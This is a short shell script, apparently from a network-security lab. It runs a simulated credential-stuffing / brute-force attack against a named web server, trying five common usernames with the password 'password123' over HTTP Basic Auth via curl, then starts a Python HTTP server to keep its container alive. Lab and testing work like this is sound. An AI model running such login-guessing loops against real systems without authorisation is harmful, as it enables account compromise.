#!/bin/sh

# Objetivo de la prueba en la DMZ
TARGET="https://servidor-web-dmz.onrender.com"

# Lista reducida para simular Credential Stuffing / Fuerza Bruta
USUARIOS="admin root user docente gestor"

echo "=== INICIANDO ATAQUE DE CREDENTIAL STUFFING / BRUTE FORCE ==="
echo "Probando combinaciones de credenciales sobre $TARGET..."

for user in $USUARIOS; do
  AUTH=$(echo -n "$user:password123" | base64)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $AUTH" "$TARGET")
  echo "Probando usuario [$user] con clave [password123] -> Respuesta HTTP: $CODE"
done

echo "=== PRUEBAS DE AUTENTICACIÓN FINALIZADAS ==="

# Mantener activo el contenedor
python3 -m http.server 8080
